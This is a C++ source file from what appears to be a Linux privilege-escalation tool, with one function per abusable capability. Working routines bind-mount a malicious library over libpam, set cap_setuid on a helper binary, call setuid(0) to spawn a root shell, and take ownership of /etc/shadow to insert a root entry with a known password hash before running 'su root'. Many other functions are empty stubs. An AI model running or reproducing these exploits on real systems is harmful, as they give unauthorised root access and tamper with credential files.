//
// Created by jacoblightning3 on 10/16/24.
//

#include "exploits.h"

#include "helpers.h"
#include <sys/capability.h>
#include <sys/types.h>
#include <unistd.h>

#include <iostream>

#include <fstream>
#include <string>
#include <sstream>
#include <sys/prctl.h>
#include <termios.h>

#include <sys/mount.h>
#include <sys/stat.h>
#include <fcntl.h>

void exploit_CAP_SYS_ADMIN() {
    if (!std::filesystem::exists("libevillib.so")) {
        std::cerr << "libevillib.so not found.\nPlease have it in the same directory." << std::endl;
        return;
    }
    std::cout << "Found libevillib" << std::endl;
    if (!std::filesystem::exists("/usr/lib/libpam.so")) {
        std::cerr << "Could not find libpam. This exploit will not work." << std::endl;
        return;
    }
    std::cout << "Found libpam" << std::endl;
    const std::filesystem::path libpam = std::filesystem::canonical("/usr/lib/libpam.so");
    std::cout << "Found temporarily overwriting " << libpam << std::endl;
    if (mount("libevillib.so", libpam.c_str(), "", MS_BIND, nullptr) != 0) {
        perror("libevillib.so");
        std::cerr << "Could not mount libevillib.so." << std::endl;
        return;
    }
    std::cout << "Overwritten " << libpam << ", running passwd. Ignore the warnings." << std::endl;
    system("passwd");
}

void exploit_CAP_MKNOD(){}

void exploit_CAP_SYS_PTRACE(){}

void exploit_CAP_SYS_RAWIO(){}

void exploit_CAP_SYS_MODULE(){}

void exploit_CAP_SETFCAP() {
    // TODO: Use this file instead of rooter.
    if (!std::filesystem::exists("rooter")) {
        std::cerr << "rooter not found.\nPlease have it in the same directory." << std::endl;
        return;
    }
    // ReSharper disable once CppLocalVariableMayBeConst
    cap_t suid = cap_from_text("cap_setuid+ep");
    if (suid == nullptr) {
        std::cerr << "cap_from_text failed." << std::endl;
        return;
    }
    // ReSharper disable once CppLocalVariableMayBeConst
    cap_t old = cap_get_file("rooter");
    cap_set_file("rooter", suid);
    cap_free(suid);
    system("./rooter");
    cap_set_file("rooter", old);
    cap_free(old);
    /*
    cap_t selfcap = cap_get_proc();

    cap_clear(selfcap);
    cap_value_t caps_list[] = {CAP_SETUID};
    cap_set_flag(selfcap, CAP_EFFECTIVE, 1, caps_list, CAP_SET);
    cap_set_flag(selfcap, CAP_PERMITTED, 1, caps_list, CAP_SET);

    if (cap_set_proc(selfcap) != 0) {
        perror("cap_set_proc");
        std::cerr << "Could not set capabilities." << std::endl;
        return;
    }
    setuid(0);
    system("bash");
    */

}

void exploit_CAP_FSETID_and_CAP_DAC_OVERRIDE() {
    // TODO: Finish This
    // We use the one that is probably not the first in path
    if (!std::filesystem::exists("/bin/passwd")) {
        std::cout << "Could not find /bin/passwd." << std::endl;
        return;
    }
}

void exploit_CAP_SETGID(){}

void exploit_CAP_SETUID() {
    std::cout << "Exploiting CAP_SETUID" << std::endl;
    if (setuid(0) != 0) {
        perror("setuid");
        return;
    }
    std::cout << "Spawning root shell." << std::endl;
    system("sg root bash");
}

void exploit_CAP_DAC_OVERRIDE(){}

void exploit_CAP_SETPCAP() {
    // TODO: THIS
    return;
    /*
    bool lowered = true;
    // Check if the capability bounding set has been lowered
    std::ifstream status_file("/proc/self/status");
    if (!status_file.is_open()) {
        std::cerr << "Error: unable to open /proc/self/status" << std::endl;
        return;
    }

    std::string line;
    while (std::getline(status_file, line)) {
        if (line.find("CapBnd") != std::string::npos) {
            std::cout << "Capability bounding set: " << line << std::endl;
            if (line.find("00000000") != std::string::npos) {
                lowered = true;
                std::cout << "Capability bounding set has been lowered, exploit will not work." << std::endl;
            } else {
                lowered = false;
                std::cout << "Capability bounding set has not been lowered" << std::endl;
            }
            break;
        }
    }
    if (lowered) {
        return;
    }
    */
    cap_t selfcap = cap_get_proc();

    //cap_clear(selfcap);
    cap_value_t caps_list[] = {CAP_SETUID};
    cap_set_flag(selfcap, CAP_INHERITABLE, 1, caps_list, CAP_SET);

    if (cap_set_proc(selfcap) != 0) {
        perror("cap_set_proc");
        std::cerr << "Could not set capabilities." << std::endl;
        return;
    } else {
        std::cout << "Capabilities set." << std::endl;
    }
    if (fork() == 0) {
        setuid(0);
        printf("uid = %d\n", getuid());
    }
    // TODO: Use this process, not rooter.
    //system("./rooter");
}

void exploit_CAP_CHOWN() {
    if (chown("/etc/shadow", getuid(), getgid()) != 0) {
        perror("chown");
        std::cerr << "Could not change ownership." << std::endl;
        return;
    }
    char shadow[18000];
    std::ifstream shadow_file("/etc/shadow");
    if (!shadow_file.is_open()) {
        std::cerr << "Could not open /etc/shadow." << std::endl;
        if (chown("/etc/shadow", 0, 0) != 0) {
            perror("chown");
            std::cerr << "Could not change ownership back." << std::endl;
        }
        return;
    }
    shadow_file.read(shadow, 18000);
    if (!shadow_file.eof() || shadow_file.bad()) {
        std::cerr << "Could not read shadow." << std::endl;
        std::cerr << "EOF: " << shadow_file.eof() << " BAD: " << shadow_file.bad() << " FAIL:" << shadow_file.fail() << std::endl;
        //std::cerr << "Buffer:" << std::endl << shadow << std::endl;
        if (chown("/etc/shadow", 0, 0) != 0) {
            perror("chown");
            std::cerr << "Could not change ownership back." << std::endl;
        }
        shadow_file.close();
        return;
    }
    shadow_file.close();
    std::istringstream shadow_stream(shadow);
    std::string line;
    bool fline = true;
    std::ofstream shadow_out("/etc/shadow");
    while (std::getline(shadow_stream, line)) {
        if (fline) {
            fline = false;
            shadow_out << "root:$y$j9T$gLo7yBjIKfkoVJtMdwd1u1$3XAI0eI3OiyWr.mzDxgK0Ct/.ODWxeRZBt.ITJlD4G3:20013::::::" << std::endl;
        }
        shadow_out << line << std::endl;
    }
    if (!shadow_out.good()) {
        std::cerr << "Could not write shadow." << std::endl;
        if (chown("/etc/shadow", 0, 0) != 0) {
            perror("chown");
            std::cerr << "Could not change ownership back." << std::endl;
        }
        shadow_file.close();
        return;
    }
    shadow_out.close();
    std::cout << "Spawning root shell." << std::endl;
    std::cout << "Enter the password \"password\"." << std::endl;
    system("su root");
    std::cout << "Cleaning up." << std::endl;

    std::ofstream shadow_restore("/etc/shadow");
    shadow_restore << shadow;
    if (!shadow_restore.good()) {
        std::cerr << "Could not restore shadow." << std::endl;
    }
    shadow_restore.close();
    if (chown("/etc/shadow", 0, 0) != 0) {
        perror("chown");
        std::cerr << "Could not change ownership back." << std::endl;
    }
}

void exploit_CAP_SYS_CHROOT(){}

void exploit_CAP_DAC_READ_SEARCH(){}

void exploit_CAP_SYS_BOOT(){}

void exploit_CAP_AUDIT_CONTROL(){}

void exploit_CAP_FOWNER(){}